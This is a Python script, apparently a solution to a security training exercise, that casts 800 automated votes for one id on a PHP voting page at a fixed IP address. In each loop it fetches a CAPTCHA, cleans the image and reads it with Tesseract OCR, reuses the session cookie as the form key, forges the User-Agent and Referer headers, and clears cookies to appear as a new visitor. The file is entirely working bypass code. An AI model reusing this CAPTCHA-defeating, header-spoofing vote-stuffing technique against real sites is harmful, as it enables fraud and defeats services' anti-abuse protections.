#!/usr/bin/python3
import requests
import pytesseract
import PIL
from PIL import ImageFilter
import io
from lxml import html
import numpy
from scipy.ndimage.filters import gaussian_filter
"""level3 module"""

url = "http://158.69.76.135/level3.php"

failed = 0
success = 0
total = 800

session = requests.Session()

for i in range(total):
    res = session.get(url)

    image = session.get('http://158.69.76.135/captcha.php')
    
    file = open("temp.png", "wb")
    file.write(image.content)
    file.close()

    img = PIL.Image.open("temp.png")
    bw = img.convert("L")
    bw.save("bw.png")
    threshold = bw.point(lambda p: p > 140 and 255)
    threshold.save("threshold.png")
    # blur = numpy.array(threshold)
    # blurred = gaussian_filter(blur, sigma=1)
    # blurred = PIL.Image.fromarray(blurred)
    # blurred.save("blurred.png")
    # final = blurred.point(lambda p: p > 140 and 255)
    final = threshold.filter(PIL.ImageFilter.EDGE_ENHANCE_MORE)
    final = final.filter(PIL.ImageFilter.SHARPEN)
    final.save("final.png")

    custom = r'-c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
    captcha = pytesseract.image_to_string(PIL.Image.open('final.png'), config=custom)


    dict = session.cookies.get_dict()
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                'Referer': url}
    data = {'id' : 2529,
            'key': dict['HoldTheDoor'],
            'captcha': captcha[0:4],
            'holdthedoor': 'Envoyer'}
    post = session.post(url, data=data, headers=headers)
    # print(post.request.headers)
    # print(post.text)
    # print(data)
    # print(captcha[0:4])
    print("Request #{:d} Key: {:s} Captcha: {:s}".format(i, dict['HoldTheDoor'], captcha[0:4]), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    session.cookies.clear()

print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))



# post = session.post(url, data)